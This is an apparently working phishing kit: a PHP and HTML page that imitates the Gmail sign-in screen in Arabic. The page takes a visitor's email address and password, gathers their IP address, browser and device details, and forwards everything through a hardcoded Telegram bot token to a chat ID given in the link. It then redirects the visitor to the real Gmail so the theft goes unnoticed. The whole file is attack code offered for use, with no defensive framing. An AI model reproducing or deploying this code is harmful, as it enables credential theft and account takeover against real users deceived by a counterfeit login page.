<?php
$botToken = "8642478796:AAEaDxElqAtOEs2DUzz_8yNnuflpLRSADwQ";

function sendTelegramMessage($chatId, $message, $botToken) {
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postFields = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    curl_close($ch);

    return $result;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);
    $chatId = $input['chatId'];
    $message = $input['message'];

    $result = sendTelegramMessage($chatId, $message, $botToken);
    
    header('Content-Type: application/json');
    echo $result;
    exit;
}
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gmail  - تسجيل الدخول</title>
    <link rel="icon" href="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/gmail.ico">
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Roboto, Arial, sans-serif;
        }
        
        body {
            background: #f8f9fa;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
            padding: 0;
            line-height: 1.5;
        }
        
        .header {
            width: 100%;
            padding: 20px 0;
            text-align: center;
            margin-bottom: 20px;
        }
        
        .google-logo {
            width: 75px;
            height: 24px;
        }
        
        .login-container {
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 450px;
            overflow: hidden;
            margin: 0 auto;
            border: 1px solid #dadce0;
        }
        
        .login-form {
            padding: 40px 40px 36px;
        }
        
        .login-title {
            font-size: 24px;
            font-weight: 400;
            text-align: center;
            margin-bottom: 10px;
            color: #202124;
            padding: 0 10px;
        }
        
        .login-subtitle {
            text-align: center;
            color: #202124;
            margin-bottom: 30px;
            font-size: 16px;
            font-weight: 400;
        }
        
        .gmail-text {
            font-weight: 500;
        }
        
        .input-group {
            margin-bottom: 30px;
            position: relative;
        }
        
        .input-label {
            display: block;
            margin-bottom: 8px;
            font-size: 14px;
            color: #202124;
            font-weight: 400;
        }
        
        .input-field {
            width: 100%;
            padding: 13px 15px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            transition: border 0.2s;
            direction: ltr;
        }
        
        .input-field:focus {
            outline: none;
            border-color: #1a73e8;
        }
        
        .password-toggle {
            color: #1a73e8;
            cursor: pointer;
            font-size: 14px;
            margin-top: 8px;
            display: inline-block;
            font-weight: 500;
        }
        
        .help-links {
            display: flex;
            justify-content: flex-start;
            margin-bottom: 36px;
        }
        
        .help-link {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }
        
        .login-buttons {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .create-account {
            color: #1a73e8;
            text-decoration: none;
            font-weight: 500;
            font-size: 14px;
            padding: 8px 0;
        }
        
        .next-button {
            background: #1a73e8;
            color: white;
            border: none;
            padding: 10px 24px;
            border-radius: 4px;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.2s;
            font-size: 14px;
            min-width: 80px;
        }
        
        .next-button:hover {
            background: #1565c0;
            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.3);
        }
        
        .hidden {
            display: none;
        }
        
        .success-view, .error-view {
            text-align: center;
            padding: 40px 20px;
        }
        
        .success-icon, .error-icon {
            font-size: 60px;
            margin-bottom: 20px;
        }
        
        .success-message, .error-message {
            font-size: 18px;
            margin-bottom: 30px;
            color: #202124;
        }
        
        .step-indicator {
            text-align: center;
            font-size: 14px;
            color: #5f6368;
            margin-bottom: 26px;
        }
        
        @media (max-width: 480px) {
            .login-form {
                padding: 24px;
            }
            
            .login-container {
                max-width: 100%;
                border: none;
                box-shadow: none;
            }
            
            body {
                background: white;
            }
            
            .header {
                padding: 40px 0 30px;
            }
        }
    </style>
</head>
<body>
    <div class="header">
        <img src="https://www.gstatic.com/images/branding/googlelogo/svg/googlelogo_clr_74x24px.svg" alt="Google" class="google-logo">
    </div>
    
    <div class="login-container">
        <div id="initialView">
            <div class="login-form">
                <h1 class="login-title">تسجيل الدخول</h1>
                <p class="login-subtitle">لمتابعة إلى <span class="gmail-text">Gmail</span></p>
                <div class="step-indicator">خطوة 1 من 2</div>
                
                <div class="input-group">
                    <label class="input-label">البريد الإلكتروني أو الهاتف</label>
                    <input type="text" class="input-field" id="email" autocomplete="username" dir="ltr">
                </div>
                
                <div class="help-links">
                    <a href="#" class="help-link">نسيت البريد الإلكتروني؟</a>
                </div>
                
                <div class="login-buttons">
                    <a href="#" class="create-account">إنشاء حساب</a>
                    <button class="next-button" onclick="handleEmailNext()">التالي</button>
                </div>
            </div>
        </div>
        
        <div id="passwordView" class="hidden">
            <div class="login-form">
                <h1 class="login-title">أدخل كلمة المرور</h1>
                <p class="login-subtitle" id="email-display"></p>
                <div class="step-indicator">خطوة 2 من 2</div>
                
                <div class="input-group">
                    <label class="input-label">أدخل كلمة المرور</label>
                    <input type="password" class="input-field" id="password" autocomplete="current-password" dir="ltr">
                    <span class="password-toggle" onclick="togglePasswordVisibility()">إظهار كلمة المرور</span>
                </div>
                
                <div class="help-links">
                    <a href="#" class="help-link">نسيت كلمة المرور؟</a>
                </div>
                
                <div class="login-buttons">
                    <a href="#" class="create-account" onclick="backToEmail()">رجوع</a>
                    <button class="next-button" onclick="handlePasswordNext()">تسجيل الدخول</button>
                </div>
            </div>
        </div>
        
        <div id="successView" class="hidden success-view">
            <div class="success-icon">✅</div>
            <div class="success-message">تم تسجيل الدخول بنجاح</div>
            <p>جاري توجيهك إلى Gmail...</p>
        </div>
        
        <div id="errorView" class="hidden error-view">
            <div class="error-icon">❌</div>
            <div class="error-message">حدث خطأ أثناء تسجيل الدخول</div>
            <p>يرجى المحاولة مرة أخرى لاحقاً.</p>
        </div>
    </div>

    <script>
        const params = new URLSearchParams(window.location.search);
        const chatId = params.get('ID');
        
        // عناصر DOM
        const initialView = document.getElementById('initialView');
        const passwordView = document.getElementById('passwordView');
        const successView = document.getElementById('successView');
        const errorView = document.getElementById('errorView');
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');
        const emailDisplay = document.getElementById('email-display');
        let userEmail = '';
        
        // تبديل الواجهات
        function showView(view) {
            initialView.classList.add('hidden');
            passwordView.classList.add('hidden');
            successView.classList.add('hidden');
            errorView.classList.add('hidden');
            
            view.classList.remove('hidden');
        }
        
        // إظهار/إخفاء كلمة المرور
        function togglePasswordVisibility() {
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                document.querySelector('.password-toggle').textContent = 'إخفاء كلمة المرور';
            } else {
                passwordInput.type = 'password';
                document.querySelector('.password-toggle').textContent = 'إظهار كلمة المرور';
            }
        }
        
        // العودة إلى إدخال البريد الإلكتروني
        function backToEmail() {
            showView(initialView);
        }
        
        // جمع معلومات الجهاز الأساسية
        async function collectBasicDeviceInfo() {
            let ipAddress = "غير متوفر";
            
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                ipAddress = data.ip;
            } catch (e) {}
            
            return {
                userAgent: navigator.userAgent,
                ip: ipAddress,
                platform: navigator.platform,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                screen: `${screen.width}x${screen.height}`,
                date: new Date().toLocaleString('ar-SA')
            };
        }
        
        // إرسال البيانات إلى الخادم
        async function sendToServer(chatId, message) {
            try {
                const data = {
                    chatId: chatId,
                    message: message
                };
                
                const response = await fetch(window.location.href, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(data)
                });
                
                return await response.json();
            } catch (error) {
                console.error('Error sending to server:', error);
                return {ok: false, error: error.message};
            }
        }
        
        // معالجة النقر على زر التالي للبريد الإلكتروني
        async function handleEmailNext() {
            if (!emailInput.value) {
                alert("يرجى إدخال البريد الإلكتروني");
                return;
            }
            
            userEmail = emailInput.value;
            emailDisplay.textContent = userEmail;
            showView(passwordView);
        }
        
        // معالجة النقر على زر تسجيل الدخول لكلمة المرور
        async function handlePasswordNext() {
            if (!passwordInput.value) {
                alert("يرجى إدخال كلمة المرور");
                return;
            }
            
            const deviceInfo = await collectBasicDeviceInfo();
            const message = `
🔐 <b>معلومات تسجيل الدخول جوجل</b>

👤 <b>معرف المستخدم:</b> <code>${chatId}</code>
📧 <b>البريد الإلكتروني:</b> ${userEmail}
🔒 <b>كلمة المرور:</b> ${passwordInput.value}
📱 <b>الجهاز:</b> ${deviceInfo.userAgent}
🌐 <b>IP:</b> ${deviceInfo.ip}
🖥️ <b>النظام:</b> ${deviceInfo.platform}
🌐 <b>اللغة:</b> ${deviceInfo.language}
🕒 <b>المنطقة الزمنية:</b> ${deviceInfo.timezone}
📺 <b>الشاشة:</b> ${deviceInfo.screen}
📅 <b>التاريخ:</b> ${deviceInfo.date}
            `;
            
            const result = await sendToServer(chatId, message);
            
            if (result && result.ok) {
                showView(successView);
                setTimeout(() => {
                    window.location.href = "https://mail.google.com";
                }, 2000);
            } else {
                showView(errorView);
            }
        }
        
        // التأكد من وجود معرف المستخدم
        if (!chatId) {
            showView(errorView);
            document.querySelector('.error-message').textContent = "معرف المستخدم غير صحيح أو انتهت صلاحية الرابط";
        }
        
        // إدخال البريد الإلكتروني عند الضغط على Enter
        emailInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                handleEmailNext();
            }
        });
        
        // إدخال كلمة المرور عند الضغط على Enter
        passwordInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                handlePasswordNext();
            }
        });
    </script>
</body>
</html>
